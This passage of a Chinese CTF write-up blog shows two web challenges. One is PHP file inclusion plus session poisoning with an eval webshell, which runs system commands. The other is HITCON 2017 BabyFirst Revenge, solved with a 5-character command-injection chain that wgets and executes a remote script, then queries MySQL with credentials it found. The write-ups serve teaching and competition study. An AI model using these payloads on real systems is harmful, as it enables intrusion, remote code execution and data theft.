class="line">&lt;/html&gt;</div><div class="line">&lt;?php</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="register-php"><a href="#register-php" class="headerlink" title="register.php"></a>register.php</h3><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php</div><div class="line">?action=php://filter/read=convert.base64-encode/resource=register.php</div></pre></td></tr></table></figure></p>
<p>register.php:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">if ($_POST['username'] &amp;&amp; $_POST['password']) &#123;</div><div class="line">    require_once('config.php');</div><div class="line"></div><div class="line">    $username = $_POST['username'];</div><div class="line">    $password = md5($_POST['password']);</div><div class="line"></div><div class="line">    $mysqli = @new mysqli($dbhost, $dbuser, $dbpass, $dbname);</div><div class="line">    if ($mysqli-&gt;connect_errno) &#123;</div><div class="line">        die("could not connect to the database:\n" . $mysqli-&gt;connect_error);</div><div class="line">    &#125;</div><div class="line">    $mysqli-&gt;set_charset("utf8");</div><div class="line">    $sql = "select * from user where username=?";</div><div class="line">    $stmt = $mysqli-&gt;prepare($sql);</div><div class="line">    $stmt-&gt;bind_param("s", $username);</div><div class="line">    $stmt-&gt;bind_result($res_id, $res_username, $res_password);</div><div class="line">    $stmt-&gt;execute();</div><div class="line">    $stmt-&gt;store_result();</div><div class="line">    $count = $stmt-&gt;num_rows();</div><div class="line">    if($count) &#123;</div><div class="line">        die('User name Already Exists');</div><div class="line">    &#125; else &#123;</div><div class="line">        $sql = "insert into user(username, password) values(?,?)";</div><div class="line">        $stmt = $mysqli-&gt;prepare($sql);</div><div class="line">        $stmt-&gt;bind_param("ss", $username, $password);</div><div class="line">        $stmt-&gt;execute();</div><div class="line">        echo 'Register OK!&lt;a href="index.php"&gt;Please Login&lt;/a&gt;';</div><div class="line">    &#125;</div><div class="line">    $stmt-&gt;close();</div><div class="line">    $mysqli-&gt;close();</div><div class="line">&#125; else &#123;</div><div class="line"></div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">   &lt;title&gt;Login&lt;/title&gt;</div><div class="line">   &lt;link href="static/bootstrap.min.css" rel="stylesheet"&gt;</div><div class="line">   &lt;script src="static/jquery.min.js"&gt;&lt;/script&gt;</div><div class="line">   &lt;script src="static/bootstrap.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">	&lt;div class="container" style="margin-top:100px"&gt;  </div><div class="line">		&lt;form action="register.php" method="post" class="well" style="width:220px;margin:0px auto;"&gt;</div><div class="line">			&lt;h3&gt;Register&lt;/h3&gt;</div><div class="line">			&lt;label&gt;Username:&lt;/label&gt;</div><div class="line">			&lt;input type="text" name="username" style="height:30px"class="span3"/&gt;</div><div class="line">			&lt;label&gt;Password:&lt;/label&gt;</div><div class="line">			&lt;input type="password" name="password" style="height:30px" class="span3"&gt;</div><div class="line"></div><div class="line">			&lt;button type="submit" class="btn btn-primary"&gt;REGISTER&lt;/button&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line">	&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line">&lt;?php</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="config-php"><a href="#config-php" class="headerlink" title="config.php"></a>config.php</h3><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php</div><div class="line">?action=php://filter/read=convert.base64-encode/resource=config.php</div></pre></td></tr></table></figure></p>
<p>config.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$dbhost = &apos;localhost&apos;;</div><div class="line">$dbuser = &apos;web&apos;;</div><div class="line">$dbpass = &apos;webpass123&apos;;</div><div class="line">$dbname = &apos;web&apos;;</div><div class="line"> ?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><p>index.php源码：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line">session_start();</div><div class="line">if (isset($_GET['action'])) &#123;</div><div class="line">    include $_GET['action'];</div><div class="line">    exit();</div><div class="line">&#125; else &#123;</div><div class="line">?&gt;</div><div class="line"></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang="en"&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset="utf-8"&gt;</div><div class="line">    &lt;title&gt;Login&lt;/title&gt;</div><div class="line">    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</div><div class="line">    &lt;link href="css/bootstrap.css" rel="stylesheet" media="screen"&gt;</div><div class="line">    &lt;link href="css/main.css" rel="stylesheet" media="screen"&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;div class="container"&gt;</div><div class="line">    &lt;div class="form-signin"&gt;</div><div class="line">        &lt;?php if (isset($_SESSION['username'])) &#123; ?&gt;</div><div class="line">            &lt;?php echo "&lt;div class=\"alert alert-success\"&gt;You have been &lt;strong&gt;successfully logged in&lt;/strong&gt;.&lt;/div&gt;</div><div class="line">&lt;a href=\"index.php?action=logout.php\" class=\"btn btn-default btn-lg btn-block\"&gt;Logout&lt;/a&gt;";&#125;else&#123; ?&gt;</div><div class="line">            &lt;?php echo "&lt;div class=\"alert alert-warning\"&gt;Please Login.&lt;/div&gt;</div><div class="line">&lt;a href=\"index.php?action=login.php\" class=\"btn btn-default btn-lg btn-block\"&gt;Login&lt;/a&gt;</div><div class="line">&lt;a href=\"index.php?action=register.php\" class=\"btn btn-default btn-lg btn-block\"&gt;Register&lt;/a&gt;";</div><div class="line">        &#125; ?&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"></div><div class="line">&lt;?php</div><div class="line"></div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="SQL注入？"><a href="#SQL注入？" class="headerlink" title="SQL注入？"></a>SQL注入？</h3><p>往往注册与登陆操作中会有与数据库交互的地方，这也是sql注入的常见引发点。</p>
<p>看一下register.php，这里仅截取部分代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># register.php</span></div><div class="line"></div><div class="line">$mysqli-&gt;set_charset(<span class="string">"utf8"</span>);</div><div class="line">$sql = <span class="string">"select * from user where username=?"</span>;</div><div class="line">$stmt = $mysqli-&gt;prepare($sql);</div><div class="line">$stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</div><div class="line">$stmt-&gt;bind_result($res_id, $res_username, $res_password);</div><div class="line">$stmt-&gt;execute();</div><div class="line">$stmt-&gt;store_result();</div></pre></td></tr></table></figure></p>
<p>再看一下login.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># login.php</span></div><div class="line"></div><div class="line">$sql = <span class="string">"select password from user where username=?"</span>;</div><div class="line">$stmt = $mysqli-&gt;prepare($sql);</div><div class="line">$stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</div><div class="line">$stmt-&gt;bind_result($res_password);</div><div class="line">$stmt-&gt;execute();</div><div class="line">$stmt-&gt;fetch();</div></pre></td></tr></table></figure></p>
<p>这里都使用了PHP的PDO处理，因此这里存在sql注入的可能性很小。</p>
<h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>接着再看看，有哪些参数是可控的。</p>
<p>在login.php中：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 第3行</span></div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>]) &#123;</div><div class="line">	header(<span class="string">'Location: index.php'</span>);</div><div class="line">	<span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment"># 第8行</span></div><div class="line"><span class="keyword">if</span>($_POST[<span class="string">'username'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]) &#123;</div><div class="line">	$username = $_POST[<span class="string">'username'</span>];</div><div class="line"></div><div class="line"><span class="comment"># 第20行</span></div><div class="line">	$stmt-&gt;bind_result($res_password);</div><div class="line"><span class="comment"># 第24行</span></div><div class="line">	<span class="keyword">if</span> ($res_password == $password) &#123;</div><div class="line">		$_SESSION[<span class="string">'username'</span>] = base64_encode($username);</div><div class="line">		header(<span class="string">"location:index.php"</span>);</div></pre></td></tr></table></figure></p>
<p>这里使用了session来保存用户会话，<a href="http://php.net/manual/zh/session.examples.basic.php" target="_blank" rel="external">php手册</a>中是这样描述的：</p>
<ol>
<li>PHP 会将会话中的数据设置到 <code>$_SESSION</code> 变量中。</li>
<li>当 PHP 停止的时候，它会自动读取 <code>$_SESSION</code> 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。</li>
<li>对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。</li>
</ol>
<p>考虑到变量<code>$username</code>是我们可控的，并且被设置到了<code>$_SESSION</code>中，因此我们输入的数据未经过滤的就被写入到了对应的sessioin文件中。结合前面的php文件包含，可以推测这里可以包含session文件。关于session包含的相关知识，可以见这篇文章<a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession">chybeta:PHP文件包含</a></p>
<p>要包含session文件，需要知道文件的路径。先注册一个用户，比如chybeta。等登陆成功后。记录下cookie中的PHPSESSID的值，这里为udu8pr09fjvabtoip8icgurt85<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/7.png?raw=true" alt=""></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php?action=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/6.png?raw=true" alt=""></p>
<p>这个<code>/var/lib/php5/</code>的session文件路径是测试出来的，常见的也就如<a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession">chybeta:PHP文件包含</a>中所述的几种。</p>
<h3 id="base64-encode"><a href="#base64-encode" class="headerlink" title="base64_encode"></a>base64_encode</h3><p>能包含，并且控制session文件，但要写入可用的payload，还需要绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_SESSION[&apos;username&apos;] = base64_encode($username);</div></pre></td></tr></table></figure></p>
<p>如前面所示，输入的用户名会被base64加密。如果直接用php伪协议来解密整个session文件，由于序列化的前缀，势必导致乱码。</p>
<p>考虑一下base64的编码过程。比如编码abc。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">未编码: abc</div><div class="line">转成ascii码： 97 98 99</div><div class="line">转成对应二进制（三组，每组8位）： 01100001 01100010 01100011</div><div class="line">重分组（四组，每组6位）： 011000 010110 001001 100011</div><div class="line">每组高位补零，变为每组8位：00011000 00010110 00001001 00100011</div><div class="line">每组对应转为十进制： 24 22 9 35</div><div class="line">查表得： Y W J j</div></pre></td></tr></table></figure></p>
<p>考虑一下session的前缀：<code>username|s:12:&quot;</code>，中间的数字12表示后面base64串的长度。当base64串的长度小于100时，前缀的长度固定为15个字符，当base64串的长度大于100小于1000时，前缀的长度固定为16个字符。</p>
<p>由于16个字符，恰好满足一下条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">16个字符 =&gt; 16 * 6 = 96 位 =&gt; 96 mod 8 = 0</div></pre></td></tr></table></figure></p>
<p>也就是说，当对session文件进行base64解密时，前16个字符固然被解密为乱码，但不会再影响从第17个字符后的部分也就是base64加密后的username。</p>
<h2 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag"></a>Get Flag</h2><p>注册一个账号，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybetachybetachybetachybetachybetachybetachybetachybetachybeta&lt;?php eval($_GET[&apos;atebyhc&apos;]) ?&gt;</div></pre></td></tr></table></figure></p>
<p>其base64加密后的长度为128，大于100。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/8.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php</div><div class="line">?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85</div><div class="line">&amp;atebyhc=phpinfo();</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/9.png?raw=true" alt=""><br>成功getshell。</p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;atebyhc=system(&apos;ls /&apos;);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/10.png?raw=true" alt=""></p>
<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;atebyhc=system(&apos;cat /fffflllllaaaagggg.txt&apos;);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/11.png?raw=true" alt=""></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>考了几个知识点：</p>
<ol>
<li>php文件包含：伪协议利用</li>
<li>php文件包含：包含session文件</li>
<li>php-session知识及序列化格式</li>
<li>base64的基本原理</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天在群里看到了几道题，这是其中之一。&lt;br&gt;PHP文件包含 Session&lt;/p&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="php文件包含" scheme="http://chybeta.github.io/tags/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>HITCON CTF 2017-BabyFirst Revenge-writeup</title>
    <link href="http://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/"/>
    <id>http://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/</id>
    <published>2017-11-04T15:32:08.000Z</published>
    <updated>2017-11-06T07:28:42.593Z</updated>
    
    <content type="html"><![CDATA[<p>HITCON CTF 2017-BabyFirst Revenge-writeup<br><a id="more"></a></p>
<h1 id="BabyFirst-Revenge"><a href="#BabyFirst-Revenge" class="headerlink" title="BabyFirst Revenge"></a>BabyFirst Revenge</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Do you remember BabyFirst from HITCON CTF 2015?</div><div class="line">This is the harder version!</div><div class="line">http://52.199.204.34/</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>点开后，发现给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">   $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</div><div class="line">   @mkdir($sandbox);</div><div class="line">   @chdir($sandbox);</div><div class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</div><div class="line">	   @exec($_GET[<span class="string">'cmd'</span>]);</div><div class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</div><div class="line">	   @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</div><div class="line">   &#125;</div><div class="line">   highlight_file(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure></p>
<p>简要的分析一下：</p>
<ol>
<li>对每个REMOTE_ADDR有对应的sandbox</li>
<li>能执行长度&lt;=5的命令</li>
<li>提供了reset功能。</li>
</ol>
<p>之前在总结时，有遇到过，见<a href="https://chybeta.gitbooks.io/waf-bypass/content/ming-ling-zhu-ru/rao-guo-fang-fa.html" target="_blank" rel="external">chybeta:wafbypass</a>，github地址为：<a href="https://github.com/CHYbeta/WAF-Bypass" target="_blank" rel="external">https://github.com/CHYbeta/WAF-Bypass</a></p>
<p>原本的长度为8，而这里为5，条件苛刻了许多。在原本的场景中，我们可以通过构造文件名，之后利用ls命令及其参数将所需的shell命令写入到一个新文件中，并sh执行该新文件从而达到任意命令执行。这里同样可以借鉴其思路。关键点有两个：</p>
<ol>
<li>长度限制</li>
<li>写入的顺序</li>
</ol>
<p>这里先补充一些基本的知识。在linux中，倘若命令过长，可以用续行符（<code>\</code>）来将一行命令变为多行来写。具体例子如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat chybeta</div><div class="line"><span class="built_in">echo</span>\</div><div class="line"> <span class="string">"chy\</span></div><div class="line">beta"</div><div class="line">ubuntu@VM-207-93-ubuntu:~$ sh chybeta</div><div class="line">chybeta</div></pre></td></tr></table></figure></p>
<p>在文件chybeta中，通过<code>\</code>将命令<code>echo &quot;chybeta&quot;</code>分成了三个部分。</p>
<p>倘若有一行出错呢？见下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat chybeta</div><div class="line">atebyhc</div><div class="line"><span class="built_in">echo</span>\</div><div class="line"> <span class="string">"chy\</span></div><div class="line">beta"</div><div class="line">ubuntu@VM-207-93-ubuntu:~$ sh chybeta</div><div class="line">chybeta: 1: chybeta: atebyhc: not found</div><div class="line">chybeta</div></pre></td></tr></table></figure></p>
<p>在最前我加了一句<code>atebyhc</code>，显然这不是命令，但这并不妨碍之后语句的执行，仍然能在<code>\</code>的作用下打印出<code>chybeta</code>。</p>
<p>接下来考虑如何构造文件。由于长度的限制，我们不能通过直接的<code>ls -t</code>来通过时间来进行文件名排序并构造。但我们可以曲线救国，先想办法把<code>ls -t&gt;q</code>写入到某个文件中，假设为文件a，然后sh执行文件a，这样命令<code>ls -t</code>的结果就能输出到文件q中。</p>
<p>我最后形成的payload1如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;-t\</div><div class="line">&gt;\&gt;q</div><div class="line">&gt;l\</div><div class="line">&gt;s\ \</div><div class="line">ls&gt;a</div><div class="line">ls&gt;&gt;a</div></pre></td></tr></table></figure></p>
<p>这里详细解释。在默认情况下，命令ls，根据名称排序，空格等最前，数字其次，字母最后。当我们执行了前四条语句后，这时文件夹中情况如下(这是我本地环境)：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/2.png?raw=true" alt=""></p>
<p>接着执行<code>ls&gt;a</code>后，a中文件内容：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/3.png?raw=true" alt=""></p>
<p>紧接着执行<code>ls&gt;&gt;a</code>，这个命令会将<code>ls</code>的结果追加到文件a中：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/4.png?raw=true" alt=""></p>
<p>其文本内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">-t\</div><div class="line">&gt;q</div><div class="line">a</div><div class="line">l\</div><div class="line">s \</div><div class="line">-t\</div><div class="line">&gt;q</div><div class="line">a</div><div class="line">l\</div><div class="line">s \</div></pre></td></tr></table></figure></p>
<p>由前面所述，错误的命令不会影响后面正确语句的正确执行，所以第一行到第三行是错误的命令可忽略，并且第三行<code>a</code>后没有续行符，这不会影响到下一行。从第四行到第七行，由于续行符（<code>\</code>），可以构成如下的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">l\</div><div class="line">s \</div><div class="line">-t\</div><div class="line">&gt;q</div></pre></td></tr></table></figure></p>
<p>也即<code>ls -t&gt;q</code>，能够根据文件的时间来进行排序并将结果写入到文件q中。剩余几行，对结果无影响可忽略。</p>
<p>接下来延续以前的套路，想办法wget远程的某个文件，这样文件中能藏有足够长的payload。为方便起见-，可以将远程服务器的ip转换为十进制，这样不用考虑小数点带来的影响。假设我们的ip转换成十进制后为：2077173*48（hh这里我隐去一位数字）。则命令<code>wget 2077173*48</code>，会从<code>2077173*48</code>处下载并默认保存为index.html。考虑到长度的限制，我们需要将上述命令分段成长度小于等于5，并用续行符<code>\</code>隔开。考虑到，前面是使用<code>ls -t&gt;q</code>，而参数<code>-t</code>，会让新生成的文件排在前面，越早生成的文件排在后面。所以构造这一部分的payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;*48</div><div class="line">&gt;173\</div><div class="line">&gt;077\</div><div class="line">&gt;\ 2\</div><div class="line">&gt;et\</div><div class="line">&gt;wg\</div></pre></td></tr></table></figure></p>
<p>此时文件目录为：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/5.png?raw=true" alt=""></p>
<p>接着执行命令<code>sh a</code>，注意文件a是我们第一阶段时生成的，其中包含命令<code>ls -t&gt;q</code>。运行完后查看新生成的文件q：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/6.png?raw=true" alt=""></p>
<p>如前所述，这里构成了一个新的命令<code>wget 2077173*48</code>。注意在<code>*48</code>的下一行是文件<code>a</code>的名字，由于它后面没有<code>\</code>，并且字母顺序在<code>s\</code>之前，刚好起了一个分割的作用。</p>
<p>接下来执行命令<code>sh q</code>，这里为演示方便在本地shell中操作，这跟访问<code>?cmd=sh%20a</code>的效果是一样的:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/7.png?raw=true" alt=""></p>
<p>可以发现成功的下载了远程的文件并保存到index.html中，而index.html是存放在我们自己的服务器上的，只要执行<code>sh%20i*</code>，注意这里用来通配符<code>*</code>，就能够执行<code>sh index.html</code>，从而执行其中的命令。</p>
<p>接下来，需要不断的进行探索flag的所在地。可以按照下述命令来实现命令的执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?cmd=rm%20i*   // 删除index.html</div><div class="line">?cmd=sh%20a    // 执行文件q，即wget新的index.html</div><div class="line">?cmd=sh%20i*   // 执行index.html中的shell命令</div></pre></td></tr></table></figure></p>
<p>在经过一番摸索后，发现在home目录的某个用户的主目录下有README.txt，其内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Flag is in the MySQL database</div><div class="line">fl4444g / SugZXUtgeJ52_Bvr</div></pre></td></tr></table></figure></p>
<p>接下去通过替换index.html的内容。</p>
<p>index.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;show databases;&quot; &gt; kk5</div></pre></td></tr></table></figure></p>
<p>访问：<a href="http://52.199.204.34/sandbox/对应md5/kk5，" target="_blank" rel="external">http://52.199.204.34/sandbox/对应md5/kk5，</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Database</div><div class="line">information_schema</div><div class="line">fl4gdb</div></pre></td></tr></table></figure></p>
<p>index.html:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x666c34676462&quot; &gt; kk7</div></pre></td></tr></table></figure></p>
<p>访问：<a href="http://52.199.204.34/sandbox/对应md5/kk7，" target="_blank" rel="external">http://52.199.204.34/sandbox/对应md5/kk7，</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GROUP_CONCAT(table_name)</div><div class="line">this_is_the_fl4g</div></pre></td></tr></table></figure></p>
